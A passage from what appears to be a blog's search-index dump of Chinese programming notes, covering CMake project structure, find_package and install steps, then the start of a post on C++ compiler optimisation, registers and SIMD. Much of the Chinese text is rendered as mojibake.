åŒåçš„æºæ–‡ä»¶å’Œå¤´æ–‡ä»¶ã€‚å¤´æ–‡ä»¶ä¸­çš„å£°æ˜å’Œæºæ–‡ä»¶ä¸­çš„å®ç°ä¸€ä¸€å¯¹åº”ã€‚ å¦‚æœæ–°æ¨¡å—ä¸­ç”¨åˆ°äº†å…¶ä»–æ¨¡å—çš„ç±»æˆ–å‡½æ•°ï¼Œåˆ™éœ€è¦åœ¨æ–°æ¨¡å—çš„å¤´æ–‡ä»¶å’Œæºæ–‡ä»¶ä¸­éƒ½å¯¼å…¥å…¶ä»–æ¨¡å—çš„å¤´æ–‡ä»¶ã€‚ æ³¨æ„ä¸è®ºæ˜¯é¡¹ç›®è‡ªå·±çš„å¤´æ–‡ä»¶è¿˜æ˜¯å¤–éƒ¨çš„ç³»ç»Ÿçš„å¤´æ–‡ä»¶ï¼Œè¯·å…¨éƒ¨ç»Ÿä¸€é‡‡ç”¨ &lt;é¡¹ç›®å/æ¨¡å—å.h&gt; çš„æ ¼å¼ã€‚ä¸è¦ç”¨ â€œæ¨¡å—å.hâ€ è¿™ç§ç›¸å¯¹è·¯å¾„çš„æ ¼å¼ï¼Œé¿å…æ¨¡å—åå’Œç³»ç»Ÿå·²æœ‰å¤´æ–‡ä»¶åå†²çªã€‚ 1234567891011121314# biology/include/biology/Carer.h#pragma once#include &lt;string&gt;namespace biology &#123;struct Animal;struct Carer &#123; std::string care(Animal *a) const;&#125;;&#125; 123456789101112131415# biology/src/Carer.cpp#include &lt;biology/Carer.h&gt;#include &lt;biology/Animal.h&gt;#include &lt;sstream&gt;namespace biology &#123;std::string Carer::care(Animal *a) const &#123; std::ostringstream ss; a-&gt;speak(ss); return ss.str();&#125;&#125; æ³¨æ„ä¸Šé¢çš„ struct Animal; å†™æ³•ï¼Œå¹¶æ²¡æœ‰å¯¼å…¥å¤´æ–‡ä»¶ã€‚ å¦‚æœæ¨¡å— Carer çš„å¤´æ–‡ä»¶ Carer.h è™½ç„¶å¼•ç”¨äº†å…¶ä»–æ¨¡å—ä¸­çš„ Animal ç±»ï¼Œä½†æ˜¯ä»–é‡Œé¢å¹¶æ²¡æœ‰è§£å¼•ç”¨ Animalï¼Œåªæœ‰æºæ–‡ä»¶ Carer.cpp è§£å¼•ç”¨äº† Animalã€‚é‚£ä¹ˆè¿™ä¸ªå¤´æ–‡ä»¶æ˜¯ä¸éœ€è¦å¯¼å…¥ Animal.h çš„ï¼Œåªéœ€è¦ä¸€ä¸ªå‰ç½®å£°æ˜ struct Animalï¼Œåªæœ‰å®é™…è°ƒç”¨äº† Animal æˆå‘˜å‡½æ•°çš„æºæ–‡ä»¶éœ€è¦å¯¼å…¥ Animal.hã€‚ è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå¯ä»¥åŠ å¿«ç¼–è¯‘é€Ÿåº¦ï¼Œé˜²æ­¢å¾ªç¯å¼•ç”¨ã€‚ åœ¨å£°æ˜å’Œå®šä¹‰å¤–é¢éƒ½å¥—ä¸€å±‚åå­—ç©ºé—´ï¼Œä¾‹å¦‚æ­¤å¤„å­é¡¹ç›®åæ˜¯ biologyï¼Œé‚£å°±ä½¿ç”¨ biology::Animalã€‚é¿å…æš´éœ²å…¨å±€çš„ Animalã€‚ è¿™æ˜¯å› ä¸ºä¸‡ä¸€æœ‰ä¸ªâ€œä¸æ‹˜ä¸€æ ¼â€çš„ç¬¬ä¸‰æ–¹åº“ä¹Ÿæš´éœ²ä¸ªå…¨å±€çš„ Animalï¼Œä¸¤ä¸ªç¬¦å·å°±ä¼šå‘ç”Ÿå†²çªã€‚ ç”±äºç±»ç¬¦å·éƒ½å…·æœ‰ weak å±æ€§ï¼Œé“¾æ¥å™¨ä¼šéšæœºé€‰æ‹©ä¸€ä¸ªè¦†ç›–æ‰ï¼Œéå¸¸å±é™©ï¼ å¦‚æœä¸€ä¸ªå­é¡¹ç›®ä¾èµ–å¦ä¸€ä¸ªå­é¡¹ç›®ï¼Œåˆ™éœ€è¦é“¾æ¥ä»–ã€‚ è®© pybmain é“¾æ¥ä¸Š biologyï¼š 1target_link_libraries(pybmain PUBLIC biology) ç”±äº PUBLIC å±æ€§å…·æœ‰ä¼ æŸ“æ€§ï¼Œæ ¹/biology/include ç°åœ¨ä¹ŸåŠ å…¥ pybmain çš„å¤´æ–‡ä»¶æœç´¢è·¯å¾„äº†ï¼Œå› æ­¤ pybmain é‡Œå¯ä»¥ #include åˆ° biology çš„å¤´æ–‡ä»¶ã€‚ åŒç†å¦‚æœåˆæœ‰ä¸€ä¸ª target_link_libraries(zxxpig PUBLIC pybmain) é‚£ä¹ˆ zxxpig ä¹Ÿæœ‰ pybmain å’Œ biology çš„æ‰€æœ‰å¤´æ–‡ä»¶æœç´¢è·¯å¾„äº†ã€‚ CMake ä¹Ÿæœ‰ include åŠŸèƒ½ å’Œ C/C++ çš„ #include ä¸€æ ·ï¼ŒCMake ä¹Ÿæœ‰ä¸€ä¸ª include å‘½ä»¤ã€‚ ä½ å†™ include(XXX) æ—¶ï¼Œåˆ™ä»–ä¼šåœ¨ CMAKE_MODULE_PATH è¿™ä¸ªåˆ—è¡¨ä¸­çš„æ‰€æœ‰è·¯å¾„ä¸‹æŸ¥æ‰¾ XXX.cmake è¿™ä¸ªæ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨ XXX.cmake é‡Œï¼Œå°±å¯ä»¥å†™ä¸€äº›ä½ å¸¸ç”¨çš„å‡½æ•°ï¼Œå®ï¼Œå˜é‡ç­‰ã€‚ 123456789101112131415# ä¸€ä¸ª xxx.cmake æ–‡ä»¶ç¤ºä¾‹macro (my_add_target name type) # ç”¨æ³•: my_add_target(pybmain EXECUTABLE) file(GLOB_RECURSE srcs CONFIGURE_DEPENDS src/*.cpp src/*.h) if (\"$&#123;type&#125;\" MATCHES \"EXECUTABLE\") add_executable($&#123;name&#125; $&#123;srcs&#125;) else() add_library($&#123;name&#125; $&#123;type&#125; $&#123;srcs&#125;) endif() target_include_directories($&#123;name&#125; PUBLIC include)endmacro()set(SOME_USEFUL_GLOBAL_VAR ON)set(ANOTHER_USEFUL_GLOBAL_VAR OFF) å¯¼å…¥æ–¹å¼æ˜¯åœ¨ CMakeLists.txt ä¸­æ·»åŠ ï¼š 123456set(CMAKE_MODULE_PATH \"$&#123;CMAKE_CURRENT_LIST_DIR&#125;/cmake;$&#123;CMAKE_MODULE_PATH&#125;\")include(MyUsefulFuncs)# å¯¹åº”äºç›®å½•ä¸­ä»¥ä¸‹æ–‡ä»¶# â”œâ”€â”€ cmake# â”‚ â””â”€â”€ MyUsefulFuncs.cmake macro å’Œ function çš„åŒºåˆ« macro ç›¸å½“äºç›´æ¥æŠŠä»£ç ç²˜è´´è¿‡å»ï¼Œç›´æ¥è®¿é—®è°ƒç”¨è€…çš„ä½œç”¨åŸŸã€‚è¿™é‡Œå†™çš„ç›¸å¯¹è·¯å¾„ include å’Œ srcï¼Œæ˜¯åŸºäºè°ƒç”¨è€…æ‰€åœ¨è·¯å¾„ã€‚ function åˆ™æ˜¯ä¼šåˆ›å»ºä¸€ä¸ªé—­åŒ…ï¼Œä¼˜å…ˆè®¿é—®å®šä¹‰è€…çš„ä½œç”¨åŸŸã€‚è¿™é‡Œå†™çš„ç›¸å¯¹è·¯å¾„ include å’Œ srcï¼Œåˆ™æ˜¯åŸºäºå®šä¹‰è€…æ‰€åœ¨è·¯å¾„ã€‚ include å’Œ add_subdirectory çš„åŒºåˆ« include ç›¸å½“äºç›´æ¥æŠŠä»£ç ç²˜è´´è¿‡å»ï¼Œç›´æ¥è®¿é—®è°ƒç”¨è€…çš„ä½œç”¨åŸŸã€‚è¿™é‡Œåˆ›å»ºçš„å˜é‡å’Œå¤–é¢å…±äº«ï¼Œç›´æ¥ set(key val) åˆ™è°ƒç”¨è€…ä¹Ÿæœ‰ ${key} è¿™ä¸ªå˜é‡äº†ã€‚ add_subdirectory è¿™ç±» function ä¸­ï¼Œåˆ™æ˜¯åŸºäºå®šä¹‰è€…æ‰€åœ¨è·¯å¾„ï¼Œä¼˜å…ˆè®¿é—®å®šä¹‰è€…çš„ä½œç”¨åŸŸã€‚è¿™é‡Œéœ€è¦åœ¨åœ¨è¢«åŒ…å«çš„å­é¡¹ç›®ä¸­ set(key val PARENT_SCOPE) ï¼Œæ‰èƒ½ä¿®æ”¹åˆ°å¤–é¢çš„å˜é‡ã€‚ ç¬¬ä¸‰æ–¹åº“ä¾èµ– find_package 1234567891011121314151617181920find_package(OpenCV)æŸ¥æ‰¾åä¸º OpenCV çš„åŒ…ï¼Œæ‰¾ä¸åˆ°ä¸æŠ¥é”™ï¼Œäº‹åå¯ä»¥é€šè¿‡ $&#123;OpenCV_FOUND&#125; æŸ¥è¯¢æ˜¯å¦æ‰¾åˆ°ã€‚find_package(OpenCV QUIET)æŸ¥æ‰¾åä¸º OpenCV çš„åŒ…ï¼Œæ‰¾ä¸åˆ°ä¸æŠ¥é”™ï¼Œä¹Ÿä¸æ‰“å°ä»»ä½•ä¿¡æ¯ã€‚find_package(OpenCV REQUIRED) # æœ€å¸¸è§ç”¨æ³•æŸ¥æ‰¾åä¸º OpenCV çš„åŒ…ï¼Œæ‰¾ä¸åˆ°å°±æŠ¥é”™ï¼ˆå¹¶ç»ˆæ­¢ cmake è¿›ç¨‹ï¼Œä¸å†ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼‰ã€‚find_package(OpenCV REQUIRED COMPONENTS core videoio)æŸ¥æ‰¾åä¸º OpenCV çš„åŒ…ï¼Œæ‰¾ä¸åˆ°å°±æŠ¥é”™ï¼Œä¸”å¿…é¡»å…·æœ‰ OpenCV::core å’Œ OpenCV::videoio è¿™ä¸¤ä¸ªç»„ä»¶ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸¤ä¸ªç»„ä»¶ä¹Ÿä¼šæŠ¥é”™ã€‚find_package(OpenCV REQUIRED OPTIONAL_COMPONENTS core videoio)æŸ¥æ‰¾åä¸º OpenCV çš„åŒ…ï¼Œæ‰¾ä¸åˆ°å°±æŠ¥é”™ï¼Œå¯å…·æœ‰ OpenCV::core å’Œ OpenCV::videoio è¿™ä¸¤ä¸ªç»„ä»¶ï¼Œæ²¡æœ‰è¿™ä¸¤ç»„ä»¶ä¸ä¼šæŠ¥é”™ï¼Œé€šè¿‡ $&#123;OpenCV_core_FOUND&#125; æŸ¥è¯¢æ˜¯å¦æ‰¾åˆ° core ç»„ä»¶ã€‚find_package(OpenCV 2.0.1 REQUIRED)æŸ¥æ‰¾ç‰ˆæœ¬åœ¨ 2.0.1 ä»¥ä¸Šçš„ OpenCV åŒ…ï¼ˆversion &gt;= 2.0.1ï¼‰find_package(OpenCV 2.0.1 EXACT REQUIRED)æŸ¥æ‰¾ç‰ˆæœ¬åˆšå¥½ä¸º 2.0.1 çš„ OpenCV åŒ…ï¼ˆversion == 2.0.1ï¼‰ find_package(OpenCV) å®é™…ä¸Šæ˜¯åœ¨æ‰¾ä¸€ä¸ªåä¸º OpenCVConfig.cmake çš„æ–‡ä»¶ã€‚ å‡ºäºå†å²å…¼å®¹æ€§è€ƒè™‘ï¼Œé™¤äº† OpenCVConfig.cmake ä»¥å¤– OpenCV-config.cmake è¿™ä¸ªæ–‡ä»¶åä¹Ÿä¼šè¢« CMake è¯†åˆ«åˆ°ã€‚ åŒç†ï¼Œfind_package(Qt5) åˆ™æ˜¯ä¼šå»æ‰¾åä¸º Qt5Config.cmake çš„æ–‡ä»¶ã€‚ Qt5Config.cmake æ˜¯ä½ å®‰è£… Qt5 æ—¶ï¼Œéš libQt5Core.so ç­‰å®é™…çš„åº“æ–‡ä»¶ï¼Œä¸€èµ·è£…åˆ°ä½ çš„ç³»ç»Ÿä¸­å»çš„ã€‚ä»¥ Arch Linux ç³»ç»Ÿä¸ºä¾‹ï¼šåŒ…é…ç½®æ–‡ä»¶ä½äº /usr/lib/cmake/Qt5/Qt5Config.cmakeã€‚å®é™…çš„åŠ¨æ€åº“æ–‡ä»¶ä½äº /usr/lib/libQt5Core.soã€‚ å› æ­¤ find_package å¹¶ä¸æ˜¯ç›´æ¥å»æ‰¾å…·ä½“çš„åŠ¨æ€åº“æ–‡ä»¶å’Œå¤´æ–‡ä»¶ï¼ˆä¾‹å¦‚ libQt5Core.soï¼‰ã€‚è€Œæ˜¯å»æ‰¾åŒ…é…ç½®æ–‡ä»¶ï¼ˆä¾‹å¦‚Qt5Config.cmakeï¼‰ï¼Œè¿™ä¸ªé…ç½®æ–‡ä»¶é‡ŒåŒ…å«äº†åŒ…çš„å…·ä½“ä¿¡æ¯ï¼ŒåŒ…æ‹¬åŠ¨æ€åº“æ–‡ä»¶çš„ä½ç½®ï¼Œå¤´æ–‡ä»¶çš„ç›®å½•ï¼Œé“¾æ¥æ—¶éœ€è¦å¼€å¯çš„ç¼–è¯‘é€‰é¡¹ç­‰ç­‰ã€‚ è€Œä¸”æŸäº›åº“éƒ½å…·æœ‰å¤šä¸ªå­åŠ¨æ€åº“ï¼Œä¾‹å¦‚ Qt å°±æœ‰ libQt5Core.soã€libQt5Widgets.soã€libQt5Network.soã€‚å› æ­¤ CMake è¦æ±‚æ‰€æœ‰ç¬¬ä¸‰æ–¹åº“ä½œè€…ç»Ÿä¸€åŒ…è£…æˆä¸€ä¸ª Qt5Config.cmake æ–‡ä»¶åŒ…å«æ‰€æœ‰ç›¸å…³ä¿¡æ¯ï¼ˆç±»ä¼¼äº nodejs çš„ package.jsonï¼‰ã€‚ åŒ…é…ç½®æ–‡ä»¶ç”±ç¬¬ä¸‰æ–¹åº“çš„ä½œè€…ï¼ˆQtçš„å¼€å‘å›¢é˜Ÿï¼‰æä¾›ï¼Œåœ¨è¿™ä¸ªåº“å®‰è£…æ—¶ï¼ˆQtçš„å®‰è£…ç¨‹åºæˆ–apt installç­‰ï¼‰ä¼šè‡ªåŠ¨æ”¾åˆ° /usr/lib/cmake/XXX/XXXConfig.cmake è¿™ä¸ªè·¯å¾„ï¼ˆå…¶ä¸­XXXæ˜¯åŒ…åï¼‰ï¼Œä¾› CMake ç”¨æˆ·æ‰¾åˆ°å¹¶äº†è§£è¯¥åŒ…çš„å…·ä½“ä¿¡æ¯ã€‚ /usr/lib/cmake è¿™ä¸ªä½ç½®æ˜¯ CMake å’Œç¬¬ä¸‰æ–¹åº“ä½œè€…çº¦å®šä¿—æˆçš„ï¼Œç”±ç¬¬ä¸‰æ–¹åº“çš„å®‰è£…ç¨‹åºè´Ÿè´£æŠŠåŒ…é…ç½®æ–‡ä»¶æ”¾åˆ°è¿™é‡Œã€‚å¦‚æœç¬¬ä¸‰æ–¹åº“çš„ä½œè€…æ¯”è¾ƒæ‡’ï¼Œæ²¡æä¾› CMake æ”¯æŒï¼ˆç”±å®‰è£…ç¨‹åºæä¾›XXXConfig.cmakeï¼‰ï¼Œé‚£ä¹ˆå¾—ç”¨å¦å¤–çš„ä¸€å¥—æ–¹æ³•ï¼ˆFindXXX.cmakeï¼‰ã€‚ ä¸€ä¸ªæœç´¢è·¯å¾„çš„ä¾‹å­ï¼š 12345678910111213141516171819202122232425ä¾‹å¦‚ 64 ä½çš„ Linux ç³»ç»Ÿï¼Œfind_package(Qt5 REQUIRED) ä¼šä¾æ¬¡æœç´¢ï¼š/usr/lib/cmake/Qt5/Qt5Config.cmake/usr/lib/x86_64-linux-gnu/cmake/Qt5/Qt5Config.cmake/usr/share/cmake/Qt5/Qt5Config.cmake/usr/lib/Qt5/Qt5Config.cmake/usr/lib/x86_64-linux-gnu/Qt5/Qt5Config.cmake/usr/share/Qt5/Qt5Config.cmake/usr/Qt5/lib/cmake/Qt5/Qt5Config.cmake/usr/Qt5/lib/x86_64-linux-gnu/cmake/Qt5/Qt5Config.cmake/usr/Qt5/share/cmake/Qt5/Qt5Config.cmake/usr/Qt5/lib/Qt5/Qt5Config.cmake/usr/Qt5/lib/x86_64-linux-gnu/Qt5/Qt5Config.cmake/usr/Qt5/share/Qt5/Qt5Config.cmakeä¾‹å¦‚ 64 ä½çš„ Windows ç³»ç»Ÿï¼Œfind_package(Qt5 REQUIRED) ä¼šä¾æ¬¡æœç´¢ï¼šC:/Program Files/Qt5Config.cmakeC:/Program Files/cmake/Qt5Config.cmakeC:/Program Files/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/cmake/Qt5Config.cmakeC:/Program Files/Qt5/lib/cmake/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/lib/x86_64-windows-gnu/cmake/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/share/cmake/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/lib/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/lib/x86_64-windows-gnu/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/share/Qt5/Qt5Config.cmake find_packageæ‰¾åˆ°é…ç½®æ–‡ä»¶ æ‰‹åŠ¨æŒ‡å®šä¸€ä¸ªå˜é‡å‘Šè¯‰é…ç½®æ–‡ä»¶åœ¨å“ªå„¿ å¯ä»¥æ˜¯æ™®é€šå˜é‡ ${Qt5_DIR} 123# é¡¹ç›®çš„ CMakeLists.txt æœ€å¼€å¤´å†™ä¸€è¡Œ# ä¸€å®šè¦åŠ åœ¨æœ€å‰é¢ï¼ï¼ï¼set(Qt5_DIR â€D:/Qt5.12.1/msvc2017/lib/cmake/Qt5â€) å¯ä»¥æ˜¯ç¯å¢ƒå˜é‡ $ENV{Qt5_DIR}ï¼Œæ·»åŠ ä¸€ä¸ªç¯å¢ƒå˜é‡ Qt5_DIR å€¼ä¸º D:/Qt5.12.1/msvc2017/lib/cmake/Qt5ï¼Œåœ¨Linuxä¸­ï¼Œå¯ä»¥export Qt5_DIR=\"/opt/Qt5.12.1/lib/cmake/Qt5\" å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œ -DQt5_DIR=â€C:/Program Files/Qt5.12.1/lib/cmake/Qt5â€ è®¾ç½® æ²¡æœ‰é…ç½®æ–‡ä»¶ï¼Ÿ CMake æä¾›äº†ä¸€äº› Find é…ç½®ï¼š 12/usr/share/cmake/Modules/FindCUDAToolkit.cmake/usr/share/cmake/Modules/FindPython.cmake github ä¸Šä¹Ÿæœ‰å¼€æºçš„FindXXX.cmake é…ç½®æ–‡ä»¶ã€‚ ä½¿ç”¨æ–¹æ³• 1234567891011# æ—§ç‰ˆæœ¬ï¼šfind_package(XXX)if (NOT XXX_FOUND) message(FATAL_ERROR â€œXXX not foundâ€)endif()target_include_directories(yourapp $&#123;XXX_INCLUDE_DIRS&#125;)target_link_libraries(yourapp $&#123;XXX_LIBRARIES&#125;)# ç°ä»£ï¼šfind_package(XXX REQUIRED COMPONENTS xxx)target_link_libraries(yourapp XXX::xxx) å¤§éƒ¨åˆ†ç¬¬ä¸‰æ–¹åº“éƒ½éœ€è¦æå‰å®‰è£…å¥½ï¼Œç„¶åå† find_package æ‰¾åˆ°ä»–ï¼Œç„¶åæ‰èƒ½é“¾æ¥ã€‚ä¹Ÿæœ‰å°‘æ•°ç¬¬ä¸‰æ–¹åº“ä¸ºäº†æ–¹ä¾¿ï¼Œè¿˜æ”¯æŒä½œä¸ºå­é¡¹ç›®åŠ åˆ°é¡¹ç›®ä¸­æ¥ï¼Œè¿™ç§å°±ä¸éœ€è¦ :: è¯­æ³•ã€‚ 123456find_package(spdlog REQUIRED)target_link_libraries(yourapp PUBLIC spdlog::spdlog)# æ·»åŠ æºç åˆ°å­ç›®å½•ä¸‹çš„æ–¹å¼add_subdirectory(spdlog) # éœ€è¦ä¸‹è½½å¥½æºç æ”¾åˆ°ä½ çš„æ ¹ç›®å½•ä¸‹target_link_libraries(yourapp PUBLIC spdlog) Unix è½¯ä»¶ä»æºç å®‰è£…çš„é€šç”¨æ–¹æ³• 123456789## Makefile æ„å»ºç³»ç»Ÿï¼š./configure --prefix=/usr --with-some-options # ç”Ÿæˆ Makefileï¼ˆè¿™ä¸ª configure è„šæœ¬ç”± Autoconf ç”Ÿæˆï¼‰make -j 8 # 8 æ ¸å¿ƒç¼–è¯‘ï¼Œç”Ÿæˆ libtest.sosudo make install # å®‰è£…ï¼Œæ‹·è´åˆ° /usr/lib/libtest.so## CMake æ„å»ºç³»ç»Ÿï¼šcmake -B build -DCMAKE_INSTALL_PREFIX=/usr -DWITH_SOME_OPTIONS=ON # ç”Ÿæˆ Makefilecmake --build build --parallel 8 # 8 æ ¸å¿ƒç¼–è¯‘ï¼Œç”Ÿæˆ libtest.sosudo cmake --build build --target install # å®‰è£…ï¼Œæ‹·è´åˆ° /usr/lib/libtest.so æ³¨ï¼šå¦‚æœ -DCMAKE_INSTALL_PREFIX=/usr/local åˆ™ä¼šæ‹·è´åˆ° /usr/local/lib/libtest.so","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"CMake","slug":"Notes/CMake","permalink":"https://racleray.github.io/categories/Notes/CMake/"}],"tags":[{"name":"C","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"CMake","slug":"CMake","permalink":"https://racleray.github.io/tags/CMake/"}],"author":"HeRui"},{"title":"C++ç¼–è¯‘å™¨ä¼˜åŒ–","slug":"C-ç¼–è¯‘å™¨ä¼˜åŒ–","date":"2023-05-12T14:25:36.000Z","updated":"2024-01-09T10:19:48.220Z","comments":true,"path":"posts/f78760c9.html","link":"","permalink":"https://racleray.github.io/posts/f78760c9.html","excerpt":"C++ç¼–è¯‘å™¨ä¼˜åŒ–ç¬”è®°","text":"x64å¯„å­˜å™¨æ¨¡å‹ 32 ä½ x86 æ¶æ„ä¸­çš„é€šç”¨å¯„å­˜å™¨æœ‰ï¼šeax, ecx, edx, ebx, esi, edi, esp, ebp å…¶ä¸­ esp æ˜¯å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œå’Œå‡½æ•°çš„è°ƒç”¨ä¸è¿”å›ç›¸å…³ã€‚ eax æ˜¯ç”¨äºä¿å­˜è¿”å›å€¼çš„å¯„å­˜å™¨ã€‚ 64 ä½ x86 æ¶æ„ä¸­çš„é€šç”¨å¯„å­˜å™¨æœ‰ï¼šrax, rcx, rdx, rbx, rsi, rdi, rsp, rbp, r8, r9, r10, r11, ..., r15 å…¶ä¸­ r8 åˆ° r15 æ˜¯ 64 ä½ x86 æ–°å¢çš„å¯„å­˜å™¨ï¼Œç»™äº†æ±‡ç¼–ç¨‹åºå‘˜æ›´å¤§çš„ç©ºé—´ï¼Œé™ä½äº†ç¼–è¯‘å™¨å¤„ç†å¯„å­˜å™¨ç¿»è½¦ï¼ˆregister spillï¼‰çš„å‹åŠ›ã€‚ 64 ä½æ¯” 32 ä½æœºå™¨ç›¸æ¯”ï¼Œé™¤äº†å†…å­˜çªç ´ 4GB é™åˆ¶å¤–ï¼Œä¹Ÿæœ‰ä¸€å®šæ€§èƒ½ä¼˜åŠ¿ã€‚ æ±‡ç¼–è¯­è¨€ GCC ç¼–è¯‘å™¨æ‰€ç”Ÿæˆçš„æ±‡ç¼–è¯­è¨€å±äºAT&amp;Tç³»åˆ—ã€‚ 1gcc -fomit-frame-pointer -fverbose-asm -S main.cpp -o asm.S ä½¿ç”¨ -O3 ï¼ˆReleaseçº§åˆ«ï¼‰æŸ¥çœ‹ç¼–è¯‘å™¨ä¼˜åŒ–åçš„æ±‡ç¼–ç¨‹åºã€‚ 1gcc -O3 -fomit-frame-pointer -fverbose-asm -S main.cpp -o asm.S lea lea æ˜¯åŠ è½½è¡¨è¾¾å¼çš„åœ°å€ï¼Œç›¸å½“äº&amp;ã€‚ 1leal (%rdi,%rsi), %eax ç›¸å½“äº 1eax = &amp;*(rdi + rsi) çº¿æ€§åœ°å€è®¿é—®ä¼˜åŒ– movslq éƒ¨åˆ†å°†32ä½å¯„å­˜å™¨æ‰©å±•åˆ°64ä½ï¼Œå†è¿›è¡Œè®¿å­˜è®¡ç®—ã€‚ ä¼˜åŒ–å»ºè®®ï¼š æŒ‡é’ˆçš„ç´¢å¼•å°½é‡ç”¨ size_t ç±»å‹ã€‚ ä¸éœ€è¦ç”¨ movslq ä» 32 ä½ç¬¦å·æ‰©å±•åˆ° 64 ä½ï¼Œæ›´é«˜æ•ˆã€‚è€Œä¸”ä¹Ÿèƒ½å¤„ç†æ•°ç»„å¤§å°è¶…è¿‡ INT_MAX çš„æƒ…å†µã€‚ æ¨èå§‹ç»ˆç”¨ size_t è¡¨ç¤ºæ•°ç»„å¤§å°å’Œç´¢å¼•ã€‚ æµ®ç‚¹å¯„å­˜å™¨ æµ®ç‚¹ä½œä¸ºå‚æ•°å’Œè¿”å›ä½¿ç”¨ xmm ç³»åˆ—å¯„å­˜å™¨ã€‚ xmm å¯„å­˜å™¨æœ‰ 128 ä½å®½ã€‚å¯ä»¥å®¹çº³ 4 ä¸ª floatï¼Œæˆ– 2 ä¸ª doubleã€‚ å¯¹äºæµ®ç‚¹æ•°å¯„å­˜å™¨æ“ä½œæŒ‡ä»¤ï¼Œæœ‰ç‰¹æ®Šçš„æŒ‡ä»¤å½¢å¼ã€‚æ¯”å¦‚åŠ æ³•ï¼š 1addss add è¡¨ç¤ºæ‰§è¡ŒåŠ æ³•æ“ä½œã€‚ ç¬¬ä¸€ä¸ª s è¡¨ç¤ºæ ‡é‡(scalar)ï¼Œåªå¯¹ xmm çš„æœ€ä½ä½è¿›è¡Œè¿ç®—ï¼›ä¹Ÿå¯ä»¥æ˜¯ p è¡¨ç¤ºçŸ¢é‡(packed)ï¼Œä¸€æ¬¡å¯¹ xmm ä¸­æ‰€æœ‰ä½è¿›è¡Œè¿ç®—ã€‚ï¼ˆå•ä¸ªæŒ‡ä»¤å¤„ç†å¤šä¸ªæ•°æ®çš„æŠ€æœ¯ç§°ä¸º SIMDï¼ˆsingle-instruction multiple-dataï¼‰ï¼‰ ç¬¬äºŒä¸ª s è¡¨ç¤ºå•ç²¾åº¦æµ®ç‚¹æ•°(single)ï¼Œå³ float ç±»å‹ï¼›ä¹Ÿå¯ä»¥æ˜¯ d è¡¨ç¤ºåŒç²¾åº¦æµ®ç‚¹æ•°(double)ï¼Œå³ double ç±»å‹ã€‚ å³ï¼š addssï¼šä¸€ä¸ª float åŠ æ³•ã€‚ addsdï¼šä¸€ä¸ª double åŠ æ³•ã€‚ addpsï¼šå››ä¸ª float åŠ æ³•ã€‚ addpdï¼šä¸¤ä¸ª double åŠ æ³•ã€‚ ç¼–è¯‘å™¨ç”Ÿæˆçš„æ±‡ç¼–é‡Œï¼Œæœ‰å¤§é‡ ss ç»“å°¾çš„æŒ‡ä»¤åˆ™è¯´æ˜çŸ¢é‡åŒ–å¤±è´¥ï¼›å¦‚æœå¤§å¤šæ•°éƒ½æ˜¯ ps ç»“å°¾åˆ™è¯´æ˜çŸ¢é‡åŒ–æˆåŠŸã€‚ SIMD single-instruction multiple-data å¯ä»¥å¤§å¤§å¢åŠ è®¡ç®—å¯†é›†å‹ç¨‹åºçš„ååé‡ã€‚ é€šå¸¸è®¤ä¸ºåˆ©ç”¨åŒæ—¶å¤„ç† 4 ä¸ª float çš„ SIMD æŒ‡ä»¤å¯ä»¥åŠ é€Ÿ 4 å€ã€‚ ä½†æ˜¯å¦‚æœä½ çš„ç®—æ³•ä¸é€‚åˆ SIMDï¼Œåˆ™å¯èƒ½åŠ é€Ÿè¾¾ä¸åˆ° 4 å€ï¼›ä¹Ÿå¯èƒ½å› ä¸º SIMD è®©è®¿é—®å†…å­˜æ›´æœ‰è§„å¾‹ï¼ŒèŠ‚çº¦äº†æŒ‡ä»¤è§£ç å’ŒæŒ‡ä»¤ç¼“å­˜çš„å‹åŠ›ç­‰åŸå› ï¼Œå‡ºç°åŠ é€Ÿè¶…è¿‡ 4 å€çš„æƒ…å†µã€‚ ç¼–è¯‘å™¨ä¼˜åŒ– å¯¹äºç®€å•çš„ä»£æ•°è¿ç®—ï¼Œç¼–è¯‘å™¨å¯ä»¥å¸®åŠ©ä¼˜åŒ–è®¡ç®—ï¼Œç›´æ¥è¿”å›ç»“æœã€‚ ä½†æ˜¯å‰ææ˜¯ï¼š1. ä»£ç ç®€å•ï¼›2. ä»£ç ä¸æ¶‰åŠåŠ¨æ€å†…å­˜åˆ†é…ã€‚ ä»£ç è¿‡äºå¤æ‚ï¼Œæ¶‰åŠçš„è¯­å¥æ•°é‡è¿‡å¤šæ—¶ï¼Œç¼–è¯‘å™¨ä¼šæ”¾å¼ƒä¼˜åŒ–ã€‚ ç®€å•çš„ä»£ç ï¼Œæ¯”ä»€ä¹ˆä¼˜åŒ–æ‰‹æ®µéƒ½å¼ºã€‚ å †ä¸Šçš„å®¹å™¨ å­˜å‚¨åœ¨å †ä¸Šï¼ˆå¦¨ç¢ä¼˜åŒ–ï¼‰ï¼š vector, map, set, string, function, any unique_ptr, shared_ptr, weak_ptr å­˜å‚¨åœ¨æ ˆä¸Šï¼ˆåˆ©äºä¼˜åŒ–ï¼‰ï¼š array, bitset, glm::vec, string_view pair, tuple, optional, variant constexpr å¦‚æœå‘ç°ç¼–è¯‘å™¨æ”¾å¼ƒäº†è‡ªåŠ¨ä¼˜åŒ–ï¼Œå¯ä»¥ç”¨ constexpr å‡½æ•°è¿«ä½¿ç¼–è¯‘å™¨è¿›è¡Œå¸¸é‡æŠ˜å ï¼Œä½†æ˜¯ä¼šè®©ç¼–è¯‘å˜å¾—å¾ˆæ…¢ã€‚ ä¸è¿‡ï¼Œconstexpr å‡½æ•°ä¸­æ— æ³•ä½¿ç”¨é constexpr çš„å®¹å™¨ï¼švector, map, set, string ç­‰ã€‚ å‡½æ•°å†…è” 